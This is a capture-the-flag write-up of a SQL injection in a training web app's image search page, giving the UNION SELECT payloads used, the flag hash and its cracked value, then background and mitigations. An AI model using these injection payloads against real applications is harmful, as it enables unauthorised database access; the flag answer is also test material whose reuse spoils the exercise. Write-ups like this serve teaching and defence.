# SQL INJECTION

## VULNERABILITY

The image search page, accessible at http://192.168.56.2/?page=searchimg, features another search-by-id functionality that appears susceptible to SQL injection.

## EXPLOIT

A simple input like **1 or 1=1** provides a list of images, with the 5th image catching our interest.
The following query revealed details about tables and columns in the database :

```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

Focusing on the "images" keyword, we identified the table "list_images" and the 4 columns : 'id', 'url', 'title', and 'comment'. The "list_images" table looks like this :

| ID  | Title   | Url         |
| --- | ------- | ----------- |
| 1   | id      | list_images |
| 1   | url     | list_images |
| 1   | title   | list_images |
| 1   | comment | list_images |

We then used the query :

```sql
5 UNION SELECT title, comment FROM list_images WHERE id=5
```

and found this message :

> Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
> Url : Hack me ?

We successfully retrieved the flag by decoding and re-encoding the hash using tools like CrackStation and CyberChef, or via the command echo -n albatroz | sha256sum.

## INFOS

SQL injection is a malicious technique that enables an attacker to manipulate or interfere with the SQL queries executed by an application to its associated database. This vulnerability can have severe consequences, **granting unauthorized access to, and control over, the database**. An attacker exploiting SQL injection may gain the ability to **read, modify, or delete sensitive data stored in the database**. This could potentially include compromising users' personal information, accessing email addresses, and obtaining passwords. The impact of SQL injection extends beyond mere unauthorized data access, as it poses a substantial threat to the confidentiality, integrity, and availability of the entire database.

## PATCH

To reduce the risks associated with SQL injection attacks, consider implementing the following security measures:

    1. Input Validation and Parameterized Statements:
      - Validate and sanitize all user inputs on the server side.
      - Use parameterized statements (prepared statements) in SQL queries to separate user input from SQL code.

    2. Stored Procedures:
      - Utilize stored procedures to encapsulate and execute SQL queries. This adds an additional layer of security by limiting direct access to the database.

    3. Least Privilege Principle:
      - Ensure that database accounts used by your application have the least privilege necessary to perform their tasks. Avoid using accounts with unnecessary permissions.

    4. Whitelisting:
      - Implement input whitelisting, allowing only predefined, safe characters or patterns. This helps prevent the injection of malicious SQL code.

    5. ORMs and Parameterized Queries:
      - If using Object-Relational Mapping (ORM) frameworks, make sure they generate parameterized queries to prevent SQL injection vulnerabilities.

    6. Error Handling:
      - Implement proper error handling to avoid exposing sensitive information in error messages. Provide generic error messages to users and log detailed errors for administrators.

    7. Web Application Firewalls (WAFs):
      - Use Web Application Firewalls to filter and monitor HTTP traffic between a web application and the Internet. WAFs can help detect and prevent SQL injection attacks.

## SOURCES

https://portswigger.net/web-security/sql-injection
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
